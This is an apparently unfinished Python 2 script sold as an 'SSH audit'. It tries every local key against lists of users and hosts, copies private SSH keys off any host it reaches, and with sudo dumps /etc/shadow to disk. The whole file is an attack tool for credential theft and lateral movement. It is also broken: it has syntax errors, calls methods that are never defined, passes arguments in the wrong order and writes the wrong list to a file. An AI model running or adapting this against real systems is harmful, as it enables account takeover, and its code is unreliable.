#!/usr/bin/env python

# Copyright (c) 2013, AverageSecurityGuy
# All rights reserved.
#
# Redistribution and use in source and binary forms, with or without modification, 
# are permitted provided that the following conditions are met:
#
#  Redistributions of source code must retain the above copyright notice, this 
#  list of conditions and the following disclaimer.
#
#  Redistributions in binary form must reproduce the above copyright notice, 
#  this list of conditions and the following disclaimer in the documentation 
#  and/or other materials provided with the distribution.
#
#  Neither the name of AverageSecurityGuy nor the names of its contributors may
#  be used to endorse or promote products derived from this software without
#  specific prior written permission.
#
# THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS" AND 
# ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED 
# WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE DISCLAIMED. 
# IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, 
# INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT 
# NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, 
# OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, 
# WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) 
# ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY 
# OF SUCH DAMAGE.

import os
import re

class ssh():
	def __init__(self, user, host, key):
		self.__user = user
		self.__host = host
		self.__key = key
		self.__re_login = re.compile(r'Please login as the user "(.*)" rather')

		# Can we authenticate successfully?
		if self.run_ssh_command('ls') is None:
			self.authenticated = False
		else:
			self.authenticated = True

		# Can we sudo?
		if self.run_ssh_command('sudo ls') is None:
			self.sudo = False
		else:
			self.sudo = True


	##
	# Run the specified command. If there is an error return None if not, 
	# return the response.
	def run_ssh_command(self, command):
		cmd = 'ssh -i {0} {1}@{2} "{3}"'.format(
							self.__key, self.__user, self.__host, command)

		output = os.popen4(cmd)
		resp = output[1].read()

		# Check for common errors and return None
		if resp.find('Permission denied') > -1: return None
		if resp.find('not a regular file') > -1: return None

		# If no errors then return output of command
		return resp


	##
	# Download and parse the passwd file to get new user accounts. Add them 
	# to the user list.
	def add_users(self):
		pass


	##
	# Download and parse the known_hosts file and add new hosts to the host 
	# list.
	def add_hosts(self):
		pass


	##
	# If we have sudo ability, get the /etc/shadow file and save it to disk.
	def get_shadow(self):
		if self.sudo is True:
			resp = run_ssh_command('sudo cat /etc/shadow')

		if resp is None:
			print '[-] Unable to save /etc/shadow from {0}'.format(self.__host)
		else:
			print '[*] Saving /etc/shadow from {0}'.format(self.__host)
			shadow = open('{0}_{1}_shadow'.format(self.__host, self.__user), 'w')
			shadow.write(resp)
			shadow.close()


	##
	# Download a new key file and save it to disk.
	def __download_new_key(self, file):
		print '[*] Downloading key {0} from {1}'.format(file, self.__host)
		resp = run_ssh_command('cat .ssh/{0}'.format(file))

		if resp is None:
			print '[-] Unable to download key'
			return False
		else:
			fname = '{0}_{1}_{2}_sshkey'.format(self.__host, self.__user, self.__key)
			sshkey = open(fname, 'w')
			sshkey.write(resp)
			sshkey.close()
			print '[+] New key downloaded.\n'.format(fname)
			return True


	##
	# Get a list of SSH keys in the .ssh directory and download them. Return 
	# the list of downloaded keys.
	def get_ssh_keys(self):
		keys = []
		resp = self.run_ssh_command('ls .ssh')
		for line in resp.split('\n'):
			if line == 'authorized_keys': continue
			if line == 'known_hosts': continue
			if line == 'config': continue
			if line == '': continue
			if self.__download_new_key(line) is True:
				keys.append(line)

		return keys


##
# Test to see if we can login and sudo on the SSH server. If so, collect new
# SSH keys, user accounts, SSL private keys, and the shadow file.
def audit_ssh(user, key, host):
	server = ssh(user, key, host)
	if server.authenticated is True:
		new_keys.extend(server.get_ssh_keys())
		users.extend(server.get_users())
		hosts.extend(server.get_hosts())
		if server.sudo is True:
			server.get_shadow()
			server.get_ssl_keys()


##
# Load SSH keys
def load_keys():
	keys = []
	print '[*] Loading SSH keys from current directory.'
	for file in os.listdir("."):
		if file.endswith(".pub"): continue
		if file == 'users': continue
		if file == 'hosts': continue
		if file == os.path.basename(__file__): continue
		keys.append(file)

	return keys


##
# Load user accounts from the 'users' file.
def load_users():
	u = []
	print '[*] Loading user accounts.'
	for line in open('users', 'r'):
		if line == '\n': continue
		u.append(line.rstrip())

	return u


##
# Update the 'users' file with the newly discovered users.
def save_users():
	u = open('users', 'w'):
	u.write('\n'.join(users))
	u.close()


##
# Load hostnames/ips from the 'hosts' file
def load_hosts():
	h = []
	print '[*] Loading hosts.'
	for line in open('hosts', 'r'):
		if line == '\n': continue
		h.append(line.rstrip())

	return h


##
# Update 'users' file with newly discovered users.
def save_hosts():
	u = open('hosts', 'w'):
	u.write('\n'.join(users))
	u.close()


##
# Main Program
if __name__ == '__main__':
	users = load_users()
	hosts = load_hosts()
	keys = load_keys()

	print '[*] Starting SSH audit.'
	for key in keys:
		for user in users:
			for host in hosts:
				audit_ssh(user, key, host)

	save_users()
	save_hosts()
